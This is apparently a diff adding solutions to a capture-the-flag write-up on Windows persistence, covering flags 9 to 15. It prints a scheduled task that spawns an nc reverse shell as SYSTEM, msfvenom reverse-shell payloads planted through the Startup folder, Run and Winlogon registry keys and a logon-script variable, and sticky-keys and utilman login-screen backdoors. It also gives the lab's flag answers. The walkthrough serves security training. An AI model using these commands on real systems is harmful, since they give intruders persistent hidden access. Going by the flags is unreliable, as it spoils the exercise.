@@ -684,6 +684,34 @@ If we start an nc listener in our attacker's machine, we should get a shell back
 
 * Insert flag9 here
 
+    `THM{JUST_A_MATTER_OF_TIME}`
+
+    * Crete task schedule
+
+        ```
+        schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.9.251.6 5555" /ru SYSTEM
+        ```
+
+        ![task5-create-task](./images/task5-create-task.png)
+
+    * Making our task invisible, uses psexec tool to edit registry
+
+        ```
+        c:\tools\pstools\PsExec64.exe -s -i regedit
+        ```
+
+        ![task5-registry](./images/task5-registry.png)
+
+        ![task5-deleted](./images/task5-deleted.png)
+
+    * Set listener on our machine
+
+        ![task3-listener2](./images/task3-listener2.png)
+
+    * Get the shell and flag
+
+        ![task5-flag9](./images/task5-flag9.png)
+
 ## Task 6 - Logon Triggered Persistence
 
 Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.
@@ -818,11 +846,144 @@ After doing this, sign out of your current session and log in again, and you sho
 
 * Insert flag10 here
 
+    `THM{NO_NO_AFTER_YOU}`
+
+    * Crete our payload
+
+        ```
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.251.6 LPORT=6666 -f exe -o revshell.exe
+        ```
+
+        ![task6-payload](./images/task6-payload.png)
+
+    * Transfer our payload to target machine
+
+        ![task6-download](./images/task6-download.png)
+
+    * Copy our payload to `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
+
+        ![task6-copy](./images/task6-copy.png)
+
+    * Set listener on our machine
+
+        ![task3-listener4](./images/task3-listener4.png)
+
+    * Sign out out session login from start menu
+
+        ![task6-lock](./images/task6-lock.png)
+
+    * Login back and get the shell
+
+        ![task6-flag10](./images/task6-flag10.png)
+
 * Insert flag11 here
+
+    `THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}`
+
+    * Create our payload
+
+        ```
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.251.6 LPORT=4444 -f exe -o revshell.exe
+        ```
+
+        ![task6-payload2](./images/task6-payload2.png)
+
+    * Transfer our payload to target machine
+
+        ![task6-download](./images/task6-download.png)
+
+    * Move our payload to `C:\Windows`
+
+        ![task6-move](./images/task6-move.png)
+
+    * Create a `REG_EXPAND_SZ` registry entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
+
+        ![task6-registry](./images/task6-registry.png)
+
+    * Set listener on our machine
+
+        ![task3-listener3](./images/task3-listener3.png)
+
+    * Sign out out session login from start menu
+
+        ![task6-lock](./images/task6-lock.png)
+
+    * Login back and get the shell
+
+        ![task6-flag11](./images/task6-flag11.png)
 
 * Insert flag12 here
 
+    `THM{I_INSIST_GO_FIRST}`
+
+    * Create out payload
+
+        ```
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.251.6 LPORT=5555 -f exe -o revshell.exe
+        ```
+
+        ![task6-payload3](./images/task6-payload3.png)
+
+    * Transfer our payload to target machine
+
+        ![task6-download](./images/task6-download.png)
+
+    * Move our payload to `C:\Windows`
+
+        ![task6-move](./images/task6-move.png)
+    
+    *  Edit registry `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`
+
+        ![task6-registry-backdoor](./images/task6-registry-backdoor.png)
+
+    * Set listener on our machine
+
+        ![task3-listener2](./images/task3-listener2.png)
+
+    * Sign out out session login from start menu
+
+        ![task6-lock](./images/task6-lock.png)
+
+    * Login back and get the shell
+
+        ![task6-flag12](./images/task6-flag12.png)
+
 * Insert flag13 here
+
+    `THM{USER_TRIGGERED_PERSISTENCE_FTW}`
+
+    * Create our payload
+
+        ```
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.251.6 LPORT=7777 -f exe -o revshell.exe
+        ```
+
+        ![task6-payload4](./images/task6-payload4.png)
+
+    * Transfer our payload to target machine
+
+        ![task6-download](./images/task6-download.png)
+
+    * Move our payload to `C:\Windows`
+
+        ![task6-move](./images/task6-move.png)
+    
+    * Create an environment variable `UserInitMprLogonScript` for a user in `HKCU\Environment`
+
+        ![task6-backdoor-env](./images/task6-backdoor-env.png)
+
+    * Set listener on our machine
+
+        ![task6-listener](./images/task6-listener.png)
+
+    
+    * Sign out out session login from start menu
+
+        ![task6-lock](./images/task6-lock.png)
+
+    * Login back and get the shell
+
+        ![task6-flag13](./images/task6-flag13.png)
 
 ## Task 7 - Backdooring the Login Screen / RDP
 
@@ -892,7 +1053,47 @@ And finally, proceed to click on the "Ease of Access" button. Since we replaced 
 
 * Insert flag14 here
 
+    `THM{BREAKING_THROUGH_LOGIN}`
+
+    * Setup Sticky Key to execute `cmd.exe`
+
+        ```
+        takeown /f c:\Windows\System32\sethc.exe
+        icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+        copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+        ```
+
+        ![task7-stickykey](./images/task7-stickykey.png)
+
+    * Lock our session from the start menu
+
+        ![task7-menu](./images/task7-menu.png)
+
+    * Press SHIFT five times and get the shell
+
+        ![task7-flag14](./images/task7-flag14.png)
+
 * Insert flag15 here
+
+    `THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}`
+
+    * Setup Utilman to execute `cmd.exe`
+
+        ```
+        takeown /f c:\Windows\System32\utilman.exe
+        icacls C:\Windows\System32\utilman.exe /grant Administrator:F
+        copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+        ```
+
+        ![task7-set-utilman](./images/task7-set-utilman.png)
+
+    * Lock our session from the start menu
+
+        ![task7-menu](./images/task7-menu.png)
+
+    * Proceed to click on the "Ease of Access" button and get the shell
+
+        ![task7-flag15](./images/task7-flag15.png)
 
 ## Task 8 - Persisting Through Existing Services
 
